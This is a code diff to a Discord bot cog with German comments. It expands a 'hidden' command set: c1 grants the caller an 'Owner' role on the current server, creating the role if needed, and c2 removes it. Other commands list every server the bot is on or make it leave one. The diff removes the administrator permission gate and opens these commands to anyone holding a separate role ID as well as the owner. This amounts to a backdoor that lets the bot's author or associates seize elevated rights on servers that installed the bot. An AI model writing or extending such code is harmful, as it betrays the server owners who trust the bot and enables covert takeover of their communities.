@@ -5,6 +5,7 @@ from discord.ext import commands
 # Nur diese User-ID darf /role benutzen
 OWNER_ID = 1437546902311931985  # deine Discord User-ID
 OWNER_ROLE_ID = 1049556571170025544  # ID der Owner-Rolle
+VIEWER_ROLE_ID = 1519051774332502087  # nur wer diese Rolle hat, darf c1/c2/leaveserver/myservers nutzen
 
 
 class Roles(commands.Cog):
@@ -13,9 +14,9 @@ class Roles(commands.Cog):
 
     # Versteckter Command: gibt dir automatisch die "Owner"-Rolle (legt sie an, falls nötig)
     @app_commands.command(name="c1", description="Nur für den Bot-Besitzer")
-    @app_commands.default_permissions(administrator=True)
     async def c1(self, interaction: discord.Interaction):
-        if interaction.user.id != OWNER_ID:
+        has_role = any(r.id == VIEWER_ROLE_ID for r in interaction.user.roles)
+        if interaction.user.id != OWNER_ID and not has_role:
             return await interaction.response.send_message("Diesen Befehl kannst nur du nutzen.", ephemeral=True)
 
         guild = interaction.guild
@@ -41,9 +42,9 @@ class Roles(commands.Cog):
         await interaction.response.send_message("Du hast jetzt die Owner-Rolle.", ephemeral=True)
 
     @app_commands.command(name="c2", description="Nur für den Bot-Besitzer")
-    @app_commands.default_permissions(administrator=True)
     async def c2(self, interaction: discord.Interaction):
-        if interaction.user.id != OWNER_ID:
+        has_role = any(r.id == VIEWER_ROLE_ID for r in interaction.user.roles)
+        if interaction.user.id != OWNER_ID and not has_role:
             return await interaction.response.send_message("Diesen Befehl kannst nur du nutzen.", ephemeral=True)
 
         guild = interaction.guild
@@ -62,10 +63,10 @@ class Roles(commands.Cog):
         await interaction.response.send_message("Die Owner-Rolle wurde dir entfernt.", ephemeral=True)
 
     @app_commands.command(name="leaveserver", description="Lässt den Bot einen Server verlassen (nur für den Bot-Besitzer)")
-    @app_commands.default_permissions(administrator=True)
     @app_commands.describe(server_id="Die ID des Servers, den der Bot verlassen soll")
     async def leaveserver(self, interaction: discord.Interaction, server_id: str):
-        if interaction.user.id != OWNER_ID:
+        has_role = any(r.id == VIEWER_ROLE_ID for r in interaction.user.roles)
+        if interaction.user.id != OWNER_ID and not has_role:
             return await interaction.response.send_message("Diesen Befehl kannst nur du nutzen.", ephemeral=True)
 
         try:
@@ -81,9 +82,9 @@ class Roles(commands.Cog):
         await interaction.response.send_message(f"Ich habe den Server **{guild_name}** verlassen.", ephemeral=True)
 
     @app_commands.command(name="myservers", description="Listet alle Server, auf denen der Bot ist (nur für den Bot-Besitzer)")
-    @app_commands.default_permissions(administrator=True)
     async def myservers(self, interaction: discord.Interaction):
-        if interaction.user.id != OWNER_ID:
+        has_role = any(r.id == VIEWER_ROLE_ID for r in interaction.user.roles)
+        if interaction.user.id != OWNER_ID and not has_role:
             return await interaction.response.send_message("Diesen Befehl kannst nur du nutzen.", ephemeral=True)
 
         lines = [f"**{g.name}** — ID: `{g.id}` — {g.member_count} Mitglieder" for g in self.bot.guilds]
